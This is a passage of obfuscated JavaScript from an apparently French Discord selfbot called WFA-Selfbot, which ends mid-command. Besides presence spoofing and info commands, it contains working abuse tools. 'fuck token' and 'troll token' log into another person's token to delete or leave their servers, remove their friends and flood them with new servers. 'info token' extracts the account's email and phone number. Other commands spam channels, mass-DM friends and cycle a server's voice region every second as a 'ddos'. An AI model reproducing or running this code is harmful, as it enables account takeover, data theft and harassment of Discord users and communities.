            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Among us")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot E")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande among us executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur among us**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "fortnite")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "fortnite")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Fortnite")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot E")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande fortnite executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur fortnite**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "rocket league")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "rocket_league")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Rocket League")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setJoinSecret"]("MTI4NzM0OjFpMmhuZToxMjMxMjM")["setPartyId"]("ae488379-351d-4a4f-ad32-2b9b01c91657")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande rocket league executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur rocket league**`)
        })
    };
    if (_0x343bx55["content"] === prefix + "channels list") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bx50["member"]["hasPermission"]("EMBED_LINKS")) {
            return _0x343bx50["edit"](`:x: **permission insuffisante (embed_links)** ${_0x343bx6b["map"]((_0x343bx6a)=>{return _0x343bx6a["name"]})}`)
        };
        const _0x343bx6b = _0x343bx50["guild"]["channels"];
        var _0x343bx5d = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setColor"](color)["addField"]("liste des salons:", _0x343bx6b["map"]((_0x343bx6a) => {
            return _0x343bx6a["name"]
        }));
        for (_0x343bx5a = 0; _0x343bx5a < 10; _0x343bx5a++) {
            _0x343bx5d["setColor"](color);
            _0x343bx50["edit"](_0x343bx5d)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        };
        console["log"]("Commande channels list executé" ["yellow"])
    };
    if (_0x343bx55["content"] === prefix + "roles list") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bx50["member"]["hasPermission"]("EMBED_LINKS")) {
            return _0x343bx50["edit"](`:x: **permission insuffisante (embed_links)** ${_0x343bx6d["map"]((_0x343bx6c)=>{return _0x343bx6c["name"]})}`)
        };
        const _0x343bx6d = _0x343bx50["guild"]["roles"];
        var _0x343bx6e = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setColor"](color)["addField"]("liste des roles:", _0x343bx6d["map"]((_0x343bx6c) => {
            return _0x343bx6c["name"]
        }));
        _0x343bx50["edit"](_0x343bx6e)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande roles list executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "cmd") {
        _0x343bx50["edit"](cmd)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande cmd executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help") {
        _0x343bx50["edit"](help)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help backup") {
        _0x343bx50["edit"](help_backup)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help backup executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help raid") {
        _0x343bx50["edit"](help_raid)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help hack executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help hack") {
        _0x343bx50["edit"](help_hack)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help raid executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help statut") {
        _0x343bx50["channel"]["send"](help_statut2);
        _0x343bx50["edit"](help_statut)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help statut executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help fun") {
        _0x343bx50["edit"](help_fun)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help fun executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help moderation") {
        _0x343bx50["edit"](help_moderation)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help moderation executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help nsfw") {
        _0x343bx50["edit"](help_nsfw)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help nsfw executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "help utile") {
        _0x343bx50["edit"](help_info)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande help utile executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "avatar" || prefix + "pp")) {
        const _0x343bx3f = _0x343bx50["mentions"]["users"]["first"]() || _0x343bx50["author"];
        const _0x343bx6f = new Discord.RichEmbed()["setAuthor"](_0x343bx3f["username"])["setImage"](_0x343bx3f["avatarURL"])["setColor"](color)["setFooter"](`WFA-Selfbot`);
        _0x343bx50["edit"](_0x343bx6f)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande avatar executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "change hypesquad brilliance") {
        let _0x343bx70 = `https://discordapp.com/api/v6/hypesquad/online`;
        request(_0x343bx70, {
            method: "POST",
            headers: {
                authorization: token,
                "content-type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36"
            },
            body: JSON["stringify"]({
                house_id: 2
            })
        });
        _0x343bx55["edit"](`:white_check_mark: **Vous avez rejoint la hypesquad 'brilliance'**`);
        console["log"]("Commande change hypesquad executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "change hypesquad ballance") {
        let _0x343bx70 = `https://discordapp.com/api/v6/hypesquad/online`;
        request(_0x343bx70, {
            method: "POST",
            headers: {
                authorization: token,
                "content-type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36"
            },
            body: JSON["stringify"]({
                house_id: 3
            })
        });
        _0x343bx55["edit"](`:white_check_mark: **Vous avez rejoint la hypesquad 'ballance'**`);
        console["log"]("Commande change hypesquad executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "change hypesquad bravery") {
        let _0x343bx70 = `https://discordapp.com/api/v6/hypesquad/online`;
        request(_0x343bx70, {
            method: "POST",
            headers: {
                authorization: token,
                "content-type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36"
            },
            body: JSON["stringify"]({
                house_id: 1
            })
        });
        _0x343bx55["edit"](`:white_check_mark: **Vous avez rejoint la hypesquad 'bravery'**`);
        console["log"]("Commande change hypesquad executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "check token")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bx70 = "https://discordapp.com/api/v6/users/@me";
        request(_0x343bx70, {
            method: "GET",
            headers: {
                authorization: _0x343bx68
            }
        }, function (_0x343bx5b, _0x343bx21, _0x343bx71) {
            if (_0x343bx21["statusCode"] === 200) {
                var _0x343bx72 = new Discord.RichEmbed()["setTitle"](`Token info`)["setDescription"](`Le token: ${_0x343bx68} \n**est 100% valide** :white_check_mark:`)["setColor"](color)["setTimestamp"]()["setFooter"](`WFA Selfbot`, _0x343bx50["author"]["avatarURL"]);
                _0x343bx50["edit"](_0x343bx72)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            } else {
                var _0x343bx73 = new Discord.RichEmbed()["setTitle"](`Token info`)["setDescription"](`Le token ${_0x343bx68} \nn'est pas valide :x:`)["setColor"](color)["setTimestamp"]()["setFooter"](`WFA Selfbot`, _0x343bx50["author"]["avatarURL"]);
                _0x343bx50["edit"](_0x343bx73)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                });
                console["log"]("Commande check token executé" ["yellow"])
            }
        })
    };
    if (_0x343bx50["content"] == prefix + "ddos voc") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bx50["member"]["hasPermission"]("ADMINISTRATOR")) {
            _0x343bx50["channel"]["send"](":x: **Il vous faut les permissions administrateur pour executer cette commande**");
            return
        };
        let _0x343bx74 = 0;
        const _0x343bx75 = ["japan", "hongkong", "russia", "india", "brazil", "sydney"];
        setInterval(() => {
            _0x343bx50["guild"]["setRegion"](_0x343bx75[_0x343bx74]);
            _0x343bx74++;
            if (_0x343bx74 == _0x343bx75["length"]) {
                _0x343bx74 = 0
            }
        }, 1000);
        _0x343bx55["edit"]("**Commande ddos vocal activé**");
        console["log"]("Commande ddos vocal executé" ["yellow"])
    };
    if (_0x343bx50["content"] == prefix + "ddos-stop") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        clearInterval();
        _0x343bx55["edit"]("**Commande ddos stopé**");
        console["log"]("Commande ddos voc stopé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "spam")) {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        let _0x343bx76 = _0x343bx56["splice"](1)["join"](" ") + " spam by WFA-Selfbot" || "@everyone\nWFA\nhttps://discord.gg/wUw8ZH7849";
        _0x343bx55["edit"]("**Wait...**");
        setInterval(() => {
            _0x343bx55["channel"]["send"](_0x343bx76)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        }, 1000);
        console["log"]("Commande spam executé" ["yellow"])
    };
    if (_0x343bx50["content"] == prefix + "stop spam") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        clearInterval();
        _0x343bx55["edit"]("**Commande spam stopé**");
        client["destroy"]()["then"](() => {
            return client["login"](token)
        });
        console["log"]("Commande spam stopé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "connect to")) {};
    if (_0x343bx50["content"]["startsWith"](prefix + "info token")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bx70 = "https://discordapp.com/api/v6/users/@me";
        request(_0x343bx70, {
            method: "GET",
            headers: {
                authorization: _0x343bx68
            }
        }, function (_0x343bx5b, _0x343bx21, _0x343bx71) {
            if (_0x343bx21["statusCode"] === 200) {
                new Promise((_0x343bx77, _0x343bx78) => {
                    let _0x343bx70 = "https://discordapp.com/api/v6/users/@me";
                    request(_0x343bx70, {
                        method: "GET",
                        headers: {
                            authorization: _0x343bx68
                        }
                    }, function (_0x343bx5b, _0x343bx21, _0x343bx71) {
                        _0x343bx71 = JSON["parse"](_0x343bx71);
                        var _0x343bx79 = _0x343bx71["id"];
                        var _0x343bx7a = _0x343bx71["username"];
                        var _0x343bx7b = _0x343bx71["avatar"];
                        var _0x343bx7c = _0x343bx71["discriminator"];
                        var _0x343bx7d = _0x343bx71["mfa_enabled"];
                        var _0x343bx7e = _0x343bx71["phone"];
                        var _0x343bx7f = _0x343bx71["locale"];
                        let _0x343bx80 = _0x343bx71["public_flags"];
                        let _0x343bx81 = _0x343bx71["flags"];
                        let _0x343bx82 = _0x343bx71["email"];
                        let _0x343bx83 = _0x343bx71["verified"];
                        let _0x343bx84 = _0x343bx71["nsfw_allowed"];
                        var _0x343bx85 = "";
                        _0x343bx85 += "\nUser: " + _0x343bx7a + "#23" + _0x343bx7c;
                        _0x343bx85 += "\nId: " + _0x343bx79;
                        _0x343bx85 += "\nEmail: " + _0x343bx82;
                        _0x343bx85 += "\nNuméro de telephone: " + _0x343bx7e;
                        _0x343bx85 += "\nAvatar: " + _0x343bx7b;
                        _0x343bx85 += "\nLangue: " + _0x343bx7f;
                        _0x343bx85 += "\nA2f activé?: " + _0x343bx7d;
                        _0x343bx85 += "\nCompte vérifié?: " + _0x343bx83;
                        _0x343bx85 += "\nNsfw activé?: " + _0x343bx84;
                        _0x343bx85 += "\nFlags: " + _0x343bx81;
                        _0x343bx85 += "\nPublic Flags: " + _0x343bx80;
                        var _0x343bx86 = new Discord.RichEmbed()["setTitle"]("**Commande Token Info**")["setDescription"](_0x343bx85)["setColor"](color)["setFooter"]("WFA-Selfbot");
                        return _0x343bx50["edit"](_0x343bx86)["then"](console["log"]("Commande info token executé" ["yellow"]))
                    })
                })
            } else {
                var _0x343bx73 = new Discord.RichEmbed()["setTitle"](`Token info`)["setDescription"](`Le token ${_0x343bx68} \nn'est pas valide :x:`)["setColor"](color)["setTimestamp"]()["setFooter"](`WFA Selfbot`, _0x343bx50["author"]["avatarURL"]);
                _0x343bx50["edit"](_0x343bx73)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            }
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "fuck token")) {
        let _0x343bx87 = new Discord.Client();
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bx70 = "https://discordapp.com/api/v6/users/@me";
        request(_0x343bx70, {
            method: "GET",
            headers: {
                authorization: _0x343bx68
            }
        }, function (_0x343bx5b, _0x343bx21, _0x343bx71) {
            if (_0x343bx21["statusCode"] === 200) {
                _0x343bx87["on"]("ready", function () {
                    for (_0x343bx5a = 0; _0x343bx5a < 100; _0x343bx5a++) {
                        _0x343bx87["user"]["createGuild"]("WFA-Selfbot", "london")
                    }
                });
                for (_0x343bx5a = 0; _0x343bx5a < 20; _0x343bx5a++) {
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        headers: {
                            authorization: _0x343bx68,
                            "content-type": "application/json"
                        },
                        body: '{"theme":"light"}',
                        method: "PATCH"
                    });
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        headers: {
                            authorization: _0x343bx68,
                            "content-type": "application/json"
                        },
                        body: '{"theme":"dark"}',
                        method: "PATCH"
                    })
                };
                _0x343bx87["on"]("ready", function () {
                    _0x343bx87["user"]["friends"]["forEach"]((_0x343bx88) => {
                        _0x343bx87["user"]["removeFriend"](_0x343bx88)["catch"]((_0x343bx5b) => {
                            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                        })
                    });
                    _0x343bx87["guilds"]["forEach"]((_0x343bx89) => {
                        if (_0x343bx89["ownerID"] === _0x343bx87["user"]["id"]) {
                            _0x343bx89["delete"]()["catch"]((_0x343bx16) => {
                                if (_0x343bx16) {
                                    console["log"]("Token timeout" ["red"])
                                }
                            })
                        } else {
                            _0x343bx89["leave"]()["catch"]((_0x343bx5b) => {
                                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                            })
                        }
                    });
                    _0x343bx50["edit"](":white_check_mark: **Token fuck en cours...**")
                });
                _0x343bx87["login"](_0x343bx68)
            } else {
                var _0x343bx73 = new Discord.RichEmbed()["setTitle"](`Token info`)["setDescription"](`Le token ${_0x343bx68} \nn'est pas valide :x:`)["setColor"](color)["setTimestamp"]()["setFooter"](`WFA Selfbot`, _0x343bx50["author"]["avatarURL"]);
                _0x343bx50["edit"](_0x343bx73)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            }
        });
        console["log"]("Commande fuck token executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "troll token")) {
        let _0x343bx87 = new Discord.Client();
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bx70 = "https://discordapp.com/api/v6/users/@me";
        request(_0x343bx70, {
            method: "GET",
            headers: {
                authorization: _0x343bx68
            }
        }, function (_0x343bx5b, _0x343bx21, _0x343bx71) {
            if (_0x343bx21["statusCode"] === 200) {
                _0x343bx87["on"]("ready", function () {
                    for (_0x343bx5a = 0; _0x343bx5a < 100; _0x343bx5a++) {
                        _0x343bx87["user"]["createGuild"]("TROLLED FDP", "london")
                    }
                });
                for (_0x343bx5a = 0; _0x343bx5a < 20; _0x343bx5a++) {
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        headers: {
                            authorization: _0x343bx68,
                            "content-type": "application/json"
                        },
                        body: '{"theme":"light"}',
                        method: "PATCH"
                    });
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        headers: {
                            authorization: _0x343bx68,
                            "content-type": "application/json"
                        },
                        body: '{"theme":"dark"}',
                        method: "PATCH"
                    })
                }
            } else {
                var _0x343bx73 = new Discord.RichEmbed()["setTitle"](`Token info`)["setDescription"](`Le token ${_0x343bx68} \nn'est pas valide :x:`)["setColor"](color)["setTimestamp"]()["setFooter"](`WFA Selfbot`, _0x343bx50["author"]["avatarURL"]);
                _0x343bx50["edit"](_0x343bx73)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                });
                console["log"]("Commande troll token executé" ["yellow"])
            }
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "8ball")) {
        let _0x343bx56 = _0x343bx50["content"]["split"](" ")["splice"](1)["join"](" ");
        var _0x343bx8a = ["oui!", "non...", "peut etre?", "probablement", "je ne pense pas.", "jamais!", "tu peux essayer..."];
        if (_0x343bx56[1] != null) {
            _0x343bx50["edit"](_0x343bx56 + "\nla reponse est: " + _0x343bx8a[Math["floor"](Math["random"]() * _0x343bx8a["length"])])["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        } else {
            _0x343bx50["edit"]("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])")
        };
        console["log"]("Commande 8ball executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "mp friend")) {
        if (!_0x343bx56) {
            throw "Vous devez mettre quelque chose à dire !"
        };
        let _0x343bx8b = _0x343bx56["splice"](2)["join"](" ") || "WFA Selfbot\nhttps://discord.gg/wUw8ZH7849";
        client["user"]["friends"]["forEach"]((_0x343bx8c) => {
            _0x343bx8c["send"](_0x343bx8b)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande mp friend executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "say")) {
        if (!_0x343bx56) {
            throw "Vous devez mettre quelque chose à dire !"
        };
        let _0x343bx8b = _0x343bx56["splice"](1)["join"](" ") || "WFA selfbot";
        let _0x343bx8d = new Discord.RichEmbed()["setTitle"]("**Commande Say**")["setDescription"](_0x343bx8b)["setTimestamp"]()["setFooter"](`WFA-Selbot`, `${client["user"]["avatarURL"]}`)["setColor"](color);
        for (_0x343bx5a = 0; _0x343bx5a < 10; _0x343bx5a++) {
            _0x343bx8d["setColor"](color);
            _0x343bx50["edit"](_0x343bx8d)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        };
        console["log"]("Commande Say executé" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "user info")) {
        if (!_0x343bx57) {
            return (_0x343bx55["edit"](":x: **Utilisateur inconnu!**"), (_0x343bx57 = _0x343bx50["author"]))
        };
        var _0x343bx8e = _0x343bx50["guild"]["member"](_0x343bx57);
        var _0x343bx8f = _0x343bx57["presence"]["game"];
        var _0x343bx90 = _0x343bx8f ? _0x343bx8f["name"] : "Nothing";
        var _0x343bx91 = !_0x343bx8e ? null : _0x343bx8e["roles"]["array"]();
        if (_0x343bx8e) {
            _0x343bx91["shift"]();
            for (var _0x343bx2c = 0; _0x343bx2c < _0x343bx91["length"]; ++_0x343bx2c) {
                _0x343bx91[_0x343bx2c] = _0x343bx91[_0x343bx2c]["name"]
            };
            _0x343bx91 = _0x343bx91["join"](", ")
        };
        var _0x343bx92 = {
            dnd: "Do Not Disturb",
            offline: "Offline/Invisible",
            online: "Online",
            idle: "Idle"
        };
        const _0x343bx86 = new Discord.RichEmbed()["setAuthor"](`${_0x343bx57["username"]}#${_0x343bx57["discriminator"]} | ${_0x343bx57["id"]}`, _0x343bx57["displayAvatarURL"])["setFooter"]("E")["setThumbnail"](_0x343bx57["displayAvatarURL"])["setColor"](color)["addField"]("Created", `${_0x343bx57["createdAt"].toString()["substr"](0,15)},\n${checkDays(_0x343bx57["createdAt"])}`, true)["addField"]("Joined", `${_0x343bx8e["joinedAt"].toString()["substr"](0,15)},\n${checkDays(_0x343bx8e["joinedAt"])}`, true)["addField"]("Status", _0x343bx92[_0x343bx57["presence"]["status"]], true)["addField"]("Playing", _0x343bx90, true)["addField"]("Nickname", _0x343bx8e["nickname"] ? _0x343bx8e["nickname"] : "None", true)["addField"]("Avatar URL", `[Click here!](${_0x343bx57["displayAvatarURL"]})`, true)["addField"]("Roles", _0x343bx91 ? _0x343bx91 : "None");
        _0x343bx55["edit"](_0x343bx86)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande user info executé" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "serveur info") {
        if (!_0x343bx55["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        const _0x343bx93 = new Date()["getTime"]() - _0x343bx55["guild"]["createdAt"]["getTime"]();
        const _0x343bx3b = _0x343bx93 / 1000 / 60 / 60 / 24;
        const _0x343bx94 = ["None", "Low", "Medium", "Insane", "Extreme"];
        let _0x343bx86 = new Discord.RichEmbed()["setTitle"]("**Serveur info**")["addField"]("Name:", `${_0x343bx55["guild"]["name"]}`)["addField"]("Created On:", `${_0x343bx50["guild"]["createdAt"].toString()["substr"](0,15)},\n${checkDays(_0x343bx50["guild"]["createdAt"])}`, true)["addField"]("Default Channel:", `${_0x343bx55["guild"]["defaultChanne"]}`)["addField"]("Region:", `${_0x343bx55["guild"]["region"]}`)["addField"]("Member Count", `${_0x343bx55["guild"]["members"]["filter"]((_0x343bx65)=>{return _0x343bx65["presence"]["status"]!== "offline"})["size"]} / ${_0x343bx55["guild"]["memberCount"]}`)["addField"]("Owner:", `${_0x343bx50["guild"]["owner"]["user"]["username"]}`)["addField"]("Text Channels", `${_0x343bx55["guild"]["channels"]["filter"]((_0x343bx65)=>{return _0x343bx65["type"]=== "text"})["size"]}`)["addField"]("Voice Channels", `${_0x343bx55["guild"]["channels"]["filter"]((_0x343bx65)=>{return _0x343bx65["type"]=== "voice"})["size"]}`)["addField"]("Verification Level", `${_0x343bx94[_0x343bx55["guild"]["verificationLevel"]]}`)["addField"]("Roles:", `${_0x343bx55["guild"]["roles"]["size"]}`)["addField"]("Guild ID:", `${_0x343bx55["guild"]["id"]}`)["setColor"](color);
        if (_0x343bx55["guild"]["iconURL"] != null) {
            _0x343bx86["setThumbnail"](`${_0x343bx55["guild"]["iconURL"]}`)
        };
        _0x343bx55["edit"](_0x343bx86)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande serveur info effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "stats") {
        let _0x343bx86 = new Discord.RichEmbed();
        _0x343bx86["setTimestamp"]()["setColor"](color)["setTitle"]("**Selfbot Statistics**")["addField"]("Mem Usage:", `${(process["memoryUsage"]()["heapUsed"]/ 1024/ 1024)["toFixed"](2)}MB`)["addField"]("Servers:", `${client["guilds"]["size"]}`)["addField"]("Channels:", `${client["channels"]["size"]}`)["addField"]("Users:", `${client["guilds"]["map"]((_0x343bx3e)=>{return _0x343bx3e["memberCount"]})["reduce"]((_0x343bx3c,_0x343bx3d)=>{return _0x343bx3c+ _0x343bx3d})}`)["addField"]("Servers:", `${client["guilds"]["size"]}`)["setFooter"]("WFA-Selfbot", `${client["user"]["avatarURL"]}`);
        if (client["user"]["premium"] > 0) {
            _0x343bx86["addField"]("\u2022 Nitro", `oui`)
        } else {
            _0x343bx86["addField"]("\u2022 Nitro", `non`)
        };
        _0x343bx50["edit"](_0x343bx86)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande stats effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "ass")) {
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "ass"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx95 = new Discord.RichEmbed()["setColor"](color)["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx95)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande ass effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "4k")) {
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "4k"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx96 = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx96)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande 4k effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "nsfw-gif")) {
        var _0x343bx97 = new Discord.RichEmbed();
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "pgif"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx97 = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx97)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande nsfw gif effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "hentai")) {
